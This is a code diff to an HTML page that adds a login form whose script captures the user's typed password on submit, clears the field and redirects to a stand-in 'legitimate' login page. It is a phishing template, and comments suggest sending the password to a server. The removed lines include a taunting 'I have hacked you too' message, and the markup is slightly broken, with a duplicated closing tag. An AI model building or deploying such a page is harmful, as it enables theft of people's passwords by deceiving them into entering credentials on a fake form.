@@ -2,19 +2,32 @@
 <html>
 <head>
 <script>
-  window.addEventListener('load', function() {
-    // Capture the password here
-    var password = document.getElementById('password').value;
+    window.addEventListener('DOMContentLoaded', (event) => {
+        var passwordField = document.getElementById('password');
+        var form = document.getElementById('loginForm');
 
-    // Do whatever you want with the captured password
-    // Store it in a variable, send it to a server, or display it on the page
-  });
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+            var password = passwordField.value;
+            // Do whatever you want with the captured password
+            // Store it in a variable, send it to a server, or display it on the page
+
+            // Clear the password field after capturing
+            passwordField.value = '';
+
+            // Redirect the user to a legitimate login page
+            window.location.href = 'https://legitimate-login-page.com';
+        });
+    });
 </script>
-
-  Video is loading my friend . Like you have hacked me I have hacked you too.haha
 </head>
 <body>
-  <h1>Welcome to My Webpage</h1>
-  <p>This is a sample webpage.</p>
+    <h1>Welcome to My Webpage</h1>
+    <form id="loginForm">
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        <input type="submit" value="Login">
+    </form>
 </body>
+</html>
 </html>
